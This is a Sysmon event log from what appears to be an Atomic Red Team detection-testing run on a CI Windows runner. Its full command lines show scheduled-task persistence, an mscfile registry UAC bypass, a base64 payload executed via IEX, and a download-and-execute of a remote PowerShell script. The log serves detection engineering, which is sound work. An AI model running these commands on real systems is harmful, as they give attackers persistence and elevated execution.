User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:38.408
ProcessGuid: {f995aebf-62ea-6942-1a05-000000000e00}
ProcessId: 9852
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ea-6942-1705-000000000e00}
ParentProcessId: 5908
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's open the Computer Management console now... & compmgmt.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 07:59:38.402
ProcessGuid: {f995aebf-62ea-6942-1905-000000000e00}
ProcessId: 764
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\mscfile\shell\open\command\(Default)
Details: c:\windows\System32\calc.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:38.376
ProcessGuid: {f995aebf-62ea-6942-1705-000000000e00}
ProcessId: 5908
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's open the Computer Management console now... & compmgmt.msc
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:37.334
ProcessGuid: {f995aebf-62e9-6942-1305-000000000e00}
ProcessId: 9228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vgi0prfp.luw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:37 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:59:35.016
ProcessGuid: {f995aebf-62e6-6942-0905-000000000e00}
ProcessId: 4172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52111
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:59:36 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:59:35.012
ProcessGuid: {f995aebf-62e6-6942-0905-000000000e00}
ProcessId: 4172
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:36.686
ProcessGuid: {f995aebf-62e8-6942-1105-000000000e00}
ProcessId: 9024
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2shlmftm.ob4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:36.593
ProcessGuid: {f995aebf-62e8-6942-1105-000000000e00}
ProcessId: 9024
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:36.328
ProcessGuid: {f995aebf-62e8-6942-1005-000000000e00}
ProcessId: 2304
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks.exe  /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e8-6942-0d05-000000000e00}
ParentProcessId: 6596
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:36.295
ProcessGuid: {f995aebf-62e8-6942-0d05-000000000e00}
ProcessId: 6596
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:35.728
ProcessGuid: {f995aebf-62e7-6942-0b05-000000000e00}
ProcessId: 6084
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2asinyvn.xbi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:35.622
ProcessGuid: {f995aebf-62e7-6942-0b05-000000000e00}
ProcessId: 6084
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:35 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:35.022
ProcessGuid: {f995aebf-62e6-6942-0905-000000000e00}
ProcessId: 4172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:34.776
ProcessGuid: {f995aebf-62e6-6942-0905-000000000e00}
ProcessId: 4172
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zkhcizz3.pvq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:34.680
ProcessGuid: {f995aebf-62e6-6942-0905-000000000e00}
ProcessId: 4172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing) 
Invoke-MalDoc -macroFile \""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""Scheduler\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:33.897
ProcessGuid: {f995aebf-62e5-6942-0705-000000000e00}
ProcessId: 4108
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rcw3mdd2.3nu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.550
ProcessGuid: {f995aebf-62e5-6942-0605-000000000e00}
ProcessId: 3120
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e5-6942-0405-000000000e00}
ParentProcessId: 1924
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.272
ProcessGuid: {f995aebf-62e5-6942-0305-000000000e00}
ProcessId: 9528
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e5-6942-0105-000000000e00}
ParentProcessId: 5328
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:32.991
ProcessGuid: {f995aebf-62e4-6942-0005-000000000e00}
ProcessId: 2196
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e4-6942-fd04-000000000e00}
ParentProcessId: 7496
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:32.953
ProcessGuid: {f995aebf-62e4-6942-ff04-000000000e00}
ProcessId: 5252
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e4-6942-fd04-000000000e00}
ParentProcessId: 7496
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:32.701
ProcessGuid: {f995aebf-62e4-6942-fc04-000000000e00}
ProcessId: 5504
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:32.684
ProcessGuid: {f995aebf-62e4-6942-fb04-000000000e00}
ProcessId: 3356
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:30.891
ProcessGuid: {f995aebf-62e2-6942-f104-000000000e00}
ProcessId: 8008
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute
Details: Binary Data
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:30.805
ProcessGuid: {f995aebf-62e2-6942-ef04-000000000e00}
ProcessId: 4112
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mxllf5do.qox.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:30 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:30.523
ProcessGuid: {f995aebf-62e2-6942-ee04-000000000e00}
ProcessId: 6136
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","12","Registry object added or deleted:
RuleName: T1547.001
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:30.291
ProcessGuid: {f995aebf-62e2-6942-ea04-000000000e00}
ProcessId: 1704
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup
User: runnervm8j6r3\runneradmin"
